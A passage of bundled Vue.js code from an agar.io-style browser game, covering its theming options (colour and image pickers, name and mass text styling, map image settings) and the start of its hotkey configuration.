                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Cursor")]),
                    t._v(" "),
                    s("image-option", {
                      staticClass: "right",
                      attrs: {
                        width: "32",
                        defaults: "",
                        value: t.cursorImageUrl,
                      },
                      on: {
                        input: function (s) {
                          return t.change("cursorImageUrl", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  {
                    staticClass: "color-input",
                    class: { disabled: !t.showBackgroundImage },
                  },
                  [
                    s("span", [t._v("Map image")]),
                    t._v(" "),
                    s("image-option", {
                      staticClass: "right",
                      attrs: {
                        width: "330",
                        defaults: t.bgDefault,
                        disabled: !t.showBackgroundImage,
                        value: t.backgroundImageUrl,
                      },
                      on: {
                        input: function (s) {
                          return t.change("backgroundImageUrl", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Viruses")]),
                    t._v(" "),
                    s("image-option", {
                      staticClass: "right",
                      attrs: {
                        width: "50",
                        defaults: t.virusDefault,
                        value: t.virusImageUrl,
                      },
                      on: {
                        input: function (s) {
                          return t.change("virusImageUrl", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Mass text")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: { value: t.cellMassColor },
                      on: {
                        input: function (s) {
                          return t.change("cellMassColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Mass outline")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: { value: t.cellMassOutlineColor },
                      on: {
                        input: function (s) {
                          return t.change("cellMassOutlineColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Cells")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: {
                        disabled: !t.useSolidCellColor,
                        value: t.solidCellColor,
                      },
                      on: {
                        input: function (s) {
                          return t.change("solidCellColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
              ]),
            ]),
          ]),
          t._v(" "),
          s("div", { staticClass: "section row" }, [
            t._m(0),
            t._v(" "),
            s(
              "div",
              { staticClass: "options" },
              [
                s("div", { staticClass: "bottom-margin" }, [
                  t._v("\n                Font\n                "),
                  s("input", {
                    attrs: {
                      type: "text",
                      spellcheck: "false",
                      placeholder: "Hind Madurai",
                      maxlength: "30",
                    },
                    domProps: { value: t.cellNameFont },
                    on: {
                      input: function (s) {
                        return t.change("cellNameFont", s);
                      },
                    },
                  }),
                ]),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "2", step: "1" },
                      domProps: { value: t.cellNameWeight },
                      on: {
                        input(s) {
                          t.change("cellNameWeight", s);
                        },
                      },
                    }),
                    t._v(`${t._s(t.cellNameWeightMeaning)} name text`),
                  ]
                ),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "2", step: "1" },
                      domProps: { value: t.cellNameOutline },
                      on: {
                        input(s) {
                          t.change("cellNameOutline", s);
                        },
                      },
                    }),
                    t._v(`${t._s(t.cellNameOutlineMeaning)} name outline`),
                  ]
                ),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "cellNameSmoothOutline",
                      checked: t.cellNameSmoothOutline,
                    },
                    on: {
                      change() {
                        t.change(
                          "cellNameSmoothOutline",
                          !t.cellNameSmoothOutline
                        );
                      },
                    },
                  }),
                  s("label", { attrs: { for: "cellNameSmoothOutline" } }, [
                    t._v("Smooth name outline"),
                  ]),
                ]),
                t._v("Long name threshold"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${t.cellLongNameThreshold}px`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "500", max: "1250", step: "50" },
                  domProps: { value: t.cellLongNameThreshold },
                  on: {
                    input(s) {
                      t.change("cellLongNameThreshold", s);
                    },
                  },
                }),
              ],
              1
            ),
          ]),
          t._v(" "),
          s("div", { staticClass: "section row" }, [
            t._m(1),
            t._v(" "),
            s(
              "div",
              { staticClass: "options" },
              [
                s("div", { staticClass: "bottom-margin" }, [
                  t._v("\r\n                Font\r\n                "),
                  s("input", {
                    attrs: {
                      type: "text",
                      spellcheck: "false",
                      placeholder: "Hind Madurai",
                      maxlength: "30",
                    },
                    domProps: { value: t.cellMassFont },
                    on: {
                      input: function (s) {
                        return t.change("cellMassFont", s);
                      },
                    },
                  }),
                ]),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "2", step: "1" },
                      domProps: { value: t.cellMassWeight },
                      on: {
                        input(s) {
                          t.change("cellMassWeight", s);
                        },
                      },
                    }),
                    t._v(`${t._s(t.cellMassWeightMeaning)} mass text`),
                  ]
                ),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "3", step: "1" },
                      domProps: { value: t.cellMassOutline },
                      on: {
                        input(s) {
                          t.change("cellMassOutline", s);
                        },
                      },
                    }),
                    t._v(`${t._s(t.cellMassOutlineMeaning)} mass outline`),
                  ]
                ),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "3", step: "1" },
                      domProps: { value: t.cellMassTextSize },
                      on: {
                        input(s) {
                          t.change("cellMassTextSize", s);
                        },
                      },
                    }),
                    t._v(`${t._s(t.cellMassTextSizeMeaning)} mass text size`),
                  ]
                ),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "cellMassSmoothOutline",
                      checked: t.cellMassSmoothOutline,
                    },
                    on: {
                      change() {
                        t.change(
                          "cellMassSmoothOutline",
                          !t.cellMassSmoothOutline
                        );
                      },
                    },
                  }),
                  s("label", { attrs: { for: "cellMassSmoothOutline" } }, [
                    t._v("Smooth mass outline"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "shortMass",
                      checked: t.shortMass,
                    },
                    on: {
                      change() {
                        t.change("shortMass", !t.shortMass);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "shortMass" } }, [
                    t._v("Short mass format"),
                  ]),
                ]),
              ],
              1
            ),
          ]),
          t._v(" "),
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [
              t._v("\n            Map\n            "),
            ]),
            t._v(" "),
            s("div", { staticClass: "options" }, [
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "showBackgroundImage",
                    checked: t.showBackgroundImage,
                  },
                  on: {
                    change() {
                      t.change("showBackgroundImage", !t.showBackgroundImage);
                    },
                  },
                }),
                s("label", { attrs: { for: "showBackgroundImage" } }, [
                  t._v("Show map image"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "backgroundImageRepeat",
                    disabled: /*!self.useWebGL ||*/ !t.showBackgroundImage,
                    checked: t.backgroundImageRepeat,
                  },
                  on: {
                    change() {
                      t.change(
                        "backgroundImageRepeat",
                        !t.backgroundImageRepeat
                      );
                    },
                  },
                }),
                s("label", { attrs: { for: "backgroundImageRepeat" } }, [
                  t._v("Repeat map image"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "backgroundDefaultIfUnequal",
                    disabled: /*!self.useWebGL || */ !t.showBackgroundImage,
                    checked: t.backgroundDefaultIfUnequal,
                  },
                  on: {
                    change() {
                      t.change(
                        "backgroundDefaultIfUnequal",
                        !t.backgroundDefaultIfUnequal
                      );
                    },
                  },
                }),
                s("label", { attrs: { for: "backgroundDefaultIfUnequal" } }, [
                  t._v("Always crop map image"),
                ]),
              ]),
              t._v("Map image opacity"),
              s("span", { staticClass: "right" }, [
                t._v(t._s(`${(100 * t.backgroundImageOpacity).toFixed(0)}%`)),
              ]),
              s("input", {
                staticClass: "form-range",
                attrs: { type: "range", min: "0.1", max: "1", step: "0.05" },
                domProps: { value: t.backgroundImageOpacity },
                on: {
                  input(s) {
                    t.change("backgroundImageOpacity", s);
                  },
                },
              }),
            ]),
          ]),
          t._v(" "),
          s("div", { staticClass: "section row" }, [
            t._m(2),
            t._v(" "),
            s("div", { staticClass: "options" }, [
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "useFoodColor",
                    checked: t.useFoodColor,
                  },
                  on: {
                    change() {
                      t.change("useFoodColor", !t.useFoodColor);
                    },
                  },
                }),
                s("label", { attrs: { for: "useFoodColor" } }, [
                  t._v("Use custom food color"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "rainbowEjectedMass",
                    checked: t.rainbowEjectedMass,
                  },
                  on: {
                    change() {
                      t.change("rainbowEjectedMass", !t.rainbowEjectedMass);
                    },
                  },
                }),
                s("label", { attrs: { for: "rainbowEjectedMass" } }, [
                  t._v("Use rainbow ejected cell color"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "useOwnCellColor",
                    checked: t.useOwnCellColor,
                  },
                  on: {
                    change() {
                      t.change("useOwnCellColor", !t.useOwnCellColor);
                    },
                  },
                }),
                s("label", { attrs: { for: "useOwnCellColor" } }, [
                  t._v("Use custom owned cell color"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "useSolidCellColor",
                    checked: t.useSolidCellColor,
                  },
                  on: {
                    change() {
                      t.change("useSolidCellColor", !t.useSolidCellColor);
                    },
                  },
                }),
                s("label", { attrs: { for: "useSolidCellColor" } }, [
                  t._v("Use custom cell color"),
                ]),
              ]),
            ]),
          ]),
          t._v(" "),
          s("div", { staticClass: "reset-option-wrapper" }, [
            s(
              "span",
              {
                staticClass: "reset-option",
                on: {
                  click: function (s) {
                    return t.confirmReset();
                  },
                },
              },
              [
                s("i", { staticClass: "fa fa-undo" }),
                t._v(" Reset\r\n        "),
              ]
            ),
          ]),
        ]);
      };
    N._withStripped = !0;
    var T = function () {
      var t = this,
        s = t.$createElement,
        i = t._self._c || s;
      return i(
        "div",
        {
          staticClass: "color-button",
          class: { disabled: t.disabled },
          style: { backgroundColor: "#" + t.hex },
          on: {
            mousedown: function (s) {
              t.disabled || t.showPicker(!0);
            },
          },
        },
        [
          t.pickerOpen
            ? i(
                "div",
                {
                  staticClass: "color-picker-wrapper",
                  on: {
                    mousedown: function (s) {
                      return t.startMovingPivot(s);
                    },
                    mousemove: function (s) {
                      return t.movePivot(s);
                    },
                    mouseup: function (s) {
                      return t.stopMovingPivot(s);
                    },
                  },
                },
                [
                  i("div", { staticClass: "color-picker-overlay" }),
                  t._v(" "),
                  i("div", { staticClass: "color-picker fade-box" }, [
                    i("input", {
                      directives: [
                        {
                          name: "model",
                          rawName: "v-model",
                          value: t.hue,
                          expression: "hue",
                        },
                      ],
                      staticClass: "color-picker-hue",
                      attrs: { type: "range", min: "0", max: "360", step: "1" },
                      domProps: { value: t.hue },
                      on: {
                        change: function (s) {
                          return t.triggerInput();
                        },
                        __r: function (s) {
                          t.hue = s.target.value;
                        },
                      },
                    }),
                    t._v(" "),
                    i(
                      "div",
                      {
                        staticClass: "color-picker-clr",
                        style: {
                          backgroundColor: "hsl(" + t.hue + ", 100%, 50%)",
                        },
                      },
                      [
                        i("div", { staticClass: "color-picker-sat" }, [
                          i("div", { staticClass: "color-picker-val" }, [
                            i("div", {
                              staticClass: "color-picker-pivot",
                              style: {
                                left: 100 * t.sat + "px",
                                top: 100 - 100 * t.val + "px",
                              },
                            }),
                          ]),
                        ]),
                      ]
                    ),
                    t._v(" "),
                    i("div", { staticClass: "color-picker-hex" }, [
                      i("span", { staticClass: "color-picker-hashtag" }, [
                        t._v("#"),
                      ]),
                      t._v(" "),
                      i("input", {
                        directives: [
                          {
                            name: "model",
                            rawName: "v-model",
                            value: t.hex,
                            expression: "hex",
                          },
                        ],
                        staticClass: "color-picker-hex",
                        attrs: {
                          type: "text",
                          spellcheck: "false",
                          maxlength: "6",
                          placeholder: "000000",
                        },
                        domProps: { value: t.hex },
                        on: {
                          input: [
                            function (s) {
                              s.target.composing || (t.hex = s.target.value);
                            },
                            function (s) {
                              return t.triggerInput();
                            },
                          ],
                        },
                      }),
                    ]),
                  ]),
                ]
              )
            : t._e(),
        ]
      );
    };
    T._withStripped = !0;
    var L = {
        data: () => ({
          pickerOpen: !1,
          movingPivot: !1,
          hue: 0,
          sat: 0,
          val: 0,
        }),
        props: ["value", "disabled"],
        computed: {
          hex: {
            get() {
              return (function (t, s, i) {
                var a, n, o, r, l, c, h, d;
                switch (
                  ((c = i * (1 - s)),
                  (h = i * (1 - (l = 6 * t - (r = Math.floor(6 * t))) * s)),
                  (d = i * (1 - (1 - l) * s)),
                  r % 6)
                ) {
                  case 0:
                    (a = i), (n = d), (o = c);
                    break;
                  case 1:
                    (a = h), (n = i), (o = c);
                    break;
                  case 2:
                    (a = c), (n = i), (o = d);
                    break;
                  case 3:
                    (a = c), (n = h), (o = i);
                    break;
                  case 4:
                    (a = d), (n = c), (o = i);
                    break;
                  case 5:
                    (a = i), (n = c), (o = h);
                }
                return (
                  (a = Math.ceil(255 * a)
                    .toString(16)
                    .padStart(2, "0")) +
                  (n = Math.ceil(255 * n)
                    .toString(16)
                    .padStart(2, "0")) +
                  (o = Math.ceil(255 * o)
                    .toString(16)
                    .padStart(2, "0"))
                );
              })(this.hue / 360, this.sat, this.val);
            },
            set(t) {
              if (((t = t.toLowerCase()), /^[0-9a-f]{6}$/.test(t))) {
                var s,
                  i,
                  a,
                  n,
                  o,
                  r,
                  l,
                  c =
                    ((s = t),
                    (i = parseInt(s.slice(0, 2), 16) / 255),
                    (a = parseInt(s.slice(2, 4), 16) / 255),
                    (n = parseInt(s.slice(4, 6), 16) / 255),
                    [
                      60 *
                        ((l =
                          (r = (o = Math.max(i, a, n)) - Math.min(i, a, n)) &&
                          (o == i
                            ? (a - n) / r
                            : o == a
                            ? 2 + (n - i) / r
                            : 4 + (i - a) / r)) < 0
                          ? l + 6
                          : l),
                      o && r / o,
                      o,
                    ]);
                (this.hue = c[0]), (this.sat = c[1]), (this.val = c[2]);
              }
            },
          },
        },
        methods: {
          showPicker(t) {
            this.pickerOpen = t;
          },
          startMovingPivot(t) {
            var s = t.target.classList;
            if (s.contains("color-picker-overlay"))
              return this.showPicker(!1), void t.stopPropagation();
            (s.contains("color-picker-pivot") ||
              s.contains("color-picker-val")) &&
              ((this.movingPivot = !0), this.movePivot(t));
          },
          movePivot(t) {
            if (this.movingPivot) {
              var s = this.$el
                  .querySelector(".color-picker-val")
                  .getBoundingClientRect(),
                i = t.clientX - s.x,
                a = t.clientY - s.y;
              (this.sat = i / 100),
                (this.val = 1 - a / 100),
                (this.sat = Math.min(Math.max(this.sat, 0), 1)),
                (this.val = Math.min(Math.max(this.val, 0), 1));
            }
          },
          stopMovingPivot(t) {
            this.movingPivot &&
              (this.movePivot(t), (this.movingPivot = !1), this.triggerInput());
          },
          triggerInput() {
            this.$emit("input", this.hex);
          },
        },
        created() {
          this.value && (this.hex = this.value);
        },
      },
      D = (i(172), Object(v.a)(L, T, [], !1, null, "5b0666af", null)).exports,
      R = function () {
        var t = this,
          s = t.$createElement,
          i = t._self._c || s;
        return i(
          "div",
          {
            staticClass: "image-button",
            class: { disabled: t.disabled },
            style: { backgroundColor: "#" + t.hex },
            on: {
              mousedown: function (s) {
                t.disabled || t.showPicker(!0);
              },
            },
          },
          [
            i("div", { staticClass: "image-button-text" }, [t._v("...")]),
            t._v(" "),
            t.pickerOpen
              ? i(
                  "div",
                  {
                    staticClass: "image-picker-wrapper",
                    on: {
                      click: function (s) {
                        return t.tryHidePicker(s);
                      },
                    },
                  },
                  [
                    i("div", { staticClass: "image-picker-overlay" }),
                    t._v(" "),
                    i("div", { staticClass: "image-picker fade-box" }, [
                      i("img", {
                        staticClass: "image-picker-preview",
                        style: { maxWidth: (t.value ? t.width : 200) + "px" },
                        attrs: {
                          src: t.value,
                          alt: "No image chosen or it is invalid",
                        },
                        on: {
                          click: function (s) {
                            return t.openFileChooser();
                          },
                          dragover: function (s) {
                            return t.allowDrop(s);
                          },
                          drop: function (s) {
                            return t.onImageDrop(s);
                          },
                        },
                      }),
                      t._v(" "),
                      i("div", { staticClass: "image-picker-information" }, [
                        t._v(
                          "\n                Click or drop onto image to change."
                        ),
                        i("br"),
                        t._v(" "),
                        "defaults" in this
                          ? i(
                              "span",
                              {
                                staticClass: "image-picker-reset",
                                on: {
                                  click: function (s) {
                                    return t.triggerInput(t.defaults);
                                  },
                                },
                              },
                              [t._v("Reset to default")]
                            )
                          : t._e(),
                      ]),
                      t._v(" "),
                      i("input", {
                        staticClass: "image-picker-input",
                        attrs: {
                          type: "file",
                          accept:
                            "image/png, image/jpeg, image/bmp, image/webp",
                        },
                        on: {
                          change: function (s) {
                            return t.onImageSelect(s);
                          },
                        },
                      }),
                    ]),
                  ]
                )
              : t._e(),
          ]
        );
      };
    R._withStripped = !0;
    var F = {
        data: () => ({ pickerOpen: !1, fileReader: null }),
        props: ["value", "width", "disabled", "defaults"],
        methods: {
          showPicker(t) {
            !this.pickerOpen && t && (this.imageLoadedOnce = !1),
              (this.pickerOpen = t);
          },
          tryHidePicker(t) {
            t.target.classList.contains("image-picker-overlay") &&
              (this.showPicker(!1), t.stopPropagation());
          },
          triggerInput(t) {
            this.$emit("input", t);
          },
          openFileChooser() {
            this.$el.querySelector(".image-picker-input").click();
          },
          allowDrop(t) {
            t.preventDefault();
          },
          getFileReader() {
            var t = new FileReader();
            return (
              t.addEventListener("load", (t) => {
                this.triggerInput(t.target.result);
              }),
              t
            );
          },
          onImageSelect(t) {
            if (0 !== t.target.files.length) {
              var s = t.target.files[0];
              s.type.startsWith("image/") &&
                this.getFileReader().readAsDataURL(s);
            }
          },
          onImageDrop(t) {
            if ((t.preventDefault(), 0 !== t.dataTransfer.files.length)) {
              var s = t.dataTransfer.files[0];
              s.type.startsWith("image/") &&
                this.getFileReader().readAsDataURL(s);
            }
          },
        },
      },
      P = (i(174), Object(v.a)(F, R, [], !1, null, "641581b7", null)).exports,
      H = i(1),
      G = i(4),
      O = i(5);
    function z(t) {
      switch (t) {
        case 0:
          return "Thin";
        case 1:
          return "Normal";
        case 2:
          return "Bold";
        default:
          return "???";
      }
    }
    function Y(t) {
      switch (t) {
        case 0:
          return "No";
        case 1:
          return "Thin";
        case 2:
          return "Thick";
        case 3:
          return "Thickest";
        default:
          return "???";
      }
    }
    function V(t, s) {
      return t
        ? new Promise((i, a) => {
            var n = new Image();
            (n.onload = () => {
              var t = document.createElement("canvas"),
                a = t.getContext("2d"),
                o = Math.max(n.width, n.height),
                r = Math.min(n.width, n.height),
                l = o === n.width,
                c = Math.min(o, s) / o,
                h = (l ? o : r) * c,
                d = (l ? r : o) * c;
              (t.width = h),
                (t.height = d),
                a.drawImage(n, 0, 0, h, d),
                i(t.toDataURL());
            }),
              (n.onerror = a),
              (n.src = t);
          })
        : null;
    }
    var Z = PIXI.utils.isWebGLSupported() && G.useWebGL,
      j = {
        components: { "color-option": D, "image-option": P },
        data: () => ({
          useWebGL: Z,
          bgDefault: G.getDefault("backgroundImageUrl"),
          virusDefault: G.getDefault("virusImageUrl"),
          backgroundColor: G.backgroundColor,
          borderColor: G.borderColor,
          foodColor: G.foodColor,
          ejectedColor: G.ejectedColor,
          cellNameOutlineColor: G.cellNameOutlineColor,
          ownCellColor: G.ownCellColor,
          solidCellColor: G.solidCellColor,
          cursorImageUrl: G.cursorImageUrl,
          backgroundImageUrl: G.backgroundImageUrl,
          virusImageUrl: G.virusImageUrl,
          cellMassColor: G.cellMassColor,
          cellMassOutlineColor: G.cellMassOutlineColor,
          cellNameFont: G.cellNameFont,
          cellNameWeight: G.cellNameWeight,
          cellNameOutline: G.cellNameOutline,
          cellNameSmoothOutline: G.cellNameSmoothOutline,
          cellMassFont: G.cellMassFont,
          cellMassWeight: G.cellMassWeight,
          cellMassOutline: G.cellMassOutline,
          cellMassSmoothOutline: G.cellMassSmoothOutline,
          cellMassTextSize: G.cellMassTextSize,
          cellLongNameThreshold: G.cellLongNameThreshold,
          shortMass: G.shortMass,
          showBackgroundImage: G.showBackgroundImage,
          backgroundImageRepeat: G.backgroundImageRepeat,
          backgroundDefaultIfUnequal: G.backgroundDefaultIfUnequal,
          backgroundImageOpacity: G.backgroundImageOpacity,
          useFoodColor: G.useFoodColor,
          useOwnCellColor: G.useOwnCellColor,
          useSolidCellColor: G.useSolidCellColor,
          rainbowEjectedMass: G.rainbowEjectedMass,
        }),
        computed: {
          cellNameWeightMeaning() {
            return z(this.cellNameWeight);
          },
          cellMassWeightMeaning() {
            return z(this.cellMassWeight);
          },
          cellNameOutlineMeaning() {
            return Y(this.cellNameOutline);
          },
          cellMassOutlineMeaning() {
            return Y(this.cellMassOutline);
          },
          cellMassTextSizeMeaning() {
            switch (this.cellMassTextSize) {
              case 0:
                return "Small";
              case 1:
                return "Normal";
              case 2:
                return "Large";
              case 3:
                return "Largest";
              default:
                return "???";
            }
          },
        },
        methods: {
          async change(t, s, i) {
            var a;
            a =
              s && s.target
                ? isNaN(s.target.valueAsNumber)
                  ? s.target.value
                  : s.target.valueAsNumber
                : s;
            try {
              switch (t) {
                case "cursorImageUrl":
                  a = await V(a, 32);
                  break;
                case "backgroundImageUrl":
                  a !== this.bgDefault && (a = await V(a, 4e3));
                  break;
                case "virusImageUrl":
                  a !== this.virusDefault && (a = await V(a, 200));
              }
            } catch (n) {
              return void O.alert("This image is too large to even be loaded.");
            }
            if (G[t] != a) {
              var o = this[t];
              try {
                G.set(t, a);
              } catch (r) {
                return (
                  G.set(t, o),
                  void O.alert(
                    "Saving this setting failed. Perhaps the image is too large?"
                  )
                );
              }
              switch (((this[t] = a), t)) {
                case "cursorImageUrl":
                  H.events.$emit("set-cursor-url", a);
                  break;
                case "cellNameOutlineColor":
                case "cellNameFont":
                case "cellNameWeight":
                case "cellNameOutline":
                case "cellNameSmoothOutline":
                  H.settings.compileNameFontStyle();
                  break;
                case "cellMassColor":
                case "cellMassOutlineColor":
                case "cellMassFont":
                case "cellMassWeight":
                case "cellMassOutline":
                case "cellMassSmoothOutline":
                case "cellMassTextSize":
                  H.settings.compileMassFontStyle();
                  break;
                case "cellLongNameThreshold":
                  H.scene && H.scene.resetPlayerLongNames();
              }
              if (H.running)
                switch (t) {
                  case "backgroundColor":
                    H.renderer.backgroundColor = PIXI.utils.string2hex(a);
                    break;
                  case "borderColor":
                    H.scene.resetBorder();
                    break;
                  case "foodColor":
                    G.useFoodColor && H.scene.reloadFoodTextures();
                    break;
                  case "ownCellColor":
                    G.useOwnCellColor && H.scene.reloadOwnCellTextures();
                    break;
                  case "solidCellColor":
                    G.useSolidCellColor && H.scene.reloadCellTextures();
                    break;
                  case "ejectedColor":
                    H.scene.reloadEjectedTextures();
                    break;
                  case "virusImageUrl":
                    H.scene.reloadVirusTexture();
                    break;
                  case "cellNameOutlineColor":
                  case "cellNameFont":
                  case "cellNameWeight":
                  case "cellNameOutline":
                  case "cellNameSmoothOutline":
                    H.scene.resetNameTextStyle();
                    break;
                  case "cellMassColor":
                  case "cellMassOutlineColor":
                  case "cellMassFont":
                  case "cellMassWeight":
                  case "cellMassOutline":
                  case "cellMassSmoothOutline":
                  case "cellMassTextSize":
                    H.scene.resetMassTextStyle(!0);
                    break;
                  case "showBackgroundImage":
                    H.scene.toggleBackgroundImage(a);
                    break;
                  case "backgroundImageUrl":
                  case "backgroundImageRepeat":
                  case "backgroundDefaultIfUnequal":
                  case "backgroundImageOpacity":
                    H.scene.setBackgroundImage();
                    break;
                  case "useFoodColor":
                    H.scene.reloadFoodTextures();
                    break;
                  case "useOwnCellColor":
                    H.scene.reloadOwnCellTextures();
                    break;
                  case "useSolidCellColor":
                    H.scene.reloadCellTextures();
                }
            }
          },
          confirmReset() {
            O.confirm(
              "Are you sure you want to reset all theming options?",
              () => this.reset()
            );
          },
          reset() {
            var t = ["useWebGL", "bgDefault", "virusDefault"];
            for (var s in this.$data)
              t.includes(s) || this.change(s, G.getDefault(s));
          },
        },
      },
      W = (i(176),
      Object(v.a)(
        j,
        N,
        [
          function () {
            var t = this.$createElement,
              s = this._self._c || t;
            return s("div", { staticClass: "header" }, [
              this._v("\n            Name text\n            "),
              s("div", { staticClass: "right silent" }, [
                this._v("Fonts from your device only"),
              ]),
            ]);
          },
          function () {
            var t = this.$createElement,
              s = this._self._c || t;
            return s("div", { staticClass: "header" }, [
              this._v("\n            Mass text\n            "),
              s("div", { staticClass: "right silent" }, [
                this._v("Fonts from your device only"),
              ]),
            ]);
          },
          function () {
            let t = this._self._c || this.$createElement;
            return t("div", { staticClass: "header" }, [
              this._v("Cells"),
              t("div", { staticClass: "right silent" }),
            ]);
          },
        ],
        !1,
        null,
        "15c13b66",
        null
      )).exports,
      J = function () {
        var t = this,
          s = t._self._c || t.$createElement;
        return s("div", { staticClass: "container" }, [
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [t._v("Player")]),
            s(
              "div",
              { staticClass: "options" },
              [
                t._l(t.availableHotkeys, function (i, a) {
                  return s("div", { key: a, staticClass: "row" }, [
                    s("span", { staticClass: "action" }, [t._v(t._s(a))]),
                    s(
                      "span",
                      {
                        staticClass: "bind",
                        attrs: { tabindex: "0" },
                        on: {
                          mousedown: function (s) {
                            return t.onMouseDown(s, i);
                          },
                          keydown: function (s) {
                            return s.preventDefault(), t.onKeyDown(s, i);
                          },
                        },
                      },
                      [t._v(t._s(t.hotkeys[i] || "NONE"))]
                    ),
                    s("div", { staticClass: "divider" }),
                  ]);
                }),
              ],
              1
            ),
          ]),
          e9.enableMinion
            ? s("div", { staticClass: "section row" }, [
                s("div", { staticClass: "header" }, [t._v("Minion")]),
                s(
                  "div",
                  { staticClass: "options" },
                  [
                    t._l(t.minionHotkeys, function (i, a) {
                      return s("div", { key: a, staticClass: "row" }, [
                        s("span", { staticClass: "action" }, [t._v(t._s(a))]),
                        s(
                          "span",
                          {
                            staticClass: "bind",
                            attrs: { tabindex: "0" },
                            on: {
                              mousedown: function (s) {
                                return t.onMouseDown(s, i);
                              },
                              keydown: function (s) {
                                return s.preventDefault(), t.onKeyDown(s, i);
                              },
                            },
                          },
                          [t._v(t._s(t.hotkeys[i] || "NONE"))]
                        ),
                        s("div", { staticClass: "divider" }),
                      ]);
                    }),
                  ],
                  1
                ),
              ])
            : t._e(),
          s("div", { staticClass: "footer" }, [
            s(
              "span",
              { staticClass: "reset-button2", on: { click: t.onResetClick } },
              [s("i", { staticClass: "fa fa-undo" }), t._v(" Reset")]
            ),
          ]),
        ]);
      };
    J._withStripped = !0;
    var K = i(65),
      X = i(5),
      q = {
        data: () => ({
          availableHotkeys: {
            "Context menu": "contextMenu",
            Feed: "feed",
            "Macro feed": "feedMacro",
            Split: "split",
            "Double split": "splitx2",
            "Triple split": "splitx3",
            "Quad split": "splitMax",
            "32 split": "split32",
            "64 split": "split64",
            "128 split": "split128",
            "256 split": "split256",
            "Diagonal linesplit": "linesplit",
            "Lock mouse direction": "lockMouse",
            "Freeze mouse": "freezeMouse",
            "Lock linesplit": "lockLinesplit",
            "Stop movement": "stopMovement",
            Respawn: "respawn",
            "Toggle auto respawn": "toggleAutoRespawn",
            "Toggle skins": "toggleSkins",
            "Toggle names": "toggleNames",
            "Toggle food": "toggleFood",
            "Toggle mass": "toggleMass",
            "Toggle chat": "toggleChat",
            "Toggle HUD": "toggleHud",
            "Toggle spectate lock": "spectateLock",
            "Save replay": "saveReplay",
            "Zoom: Level 1": "zoomLevel1",
            "Zoom: Level 2": "zoomLevel2",
            "Zoom: Level 3": "zoomLevel3",
            "Zoom: Level 4": "zoomLevel4",
            "Zoom: Level 5": "zoomLevel5",
            "Chat: Help": "chatPreset1",
            "Chat: Tricksplit": "chatPreset2",
            "Chat: Linesplit": "chatPreset3",
            "Chat: Bait": "chatPreset4",
            "Chat: Teammate": "chatPreset5",
            "Chat: Feed": "chatPreset6",
            "Chat: Sector": "chatPreset7",
          },
          minionHotkeys: {
            Feed: "m-feed",
            "Feed macro": "m-feedMacro",
            Split: "m-split",
            "Double split": "m-splitx2",
            "Triple split": "m-splitx3",
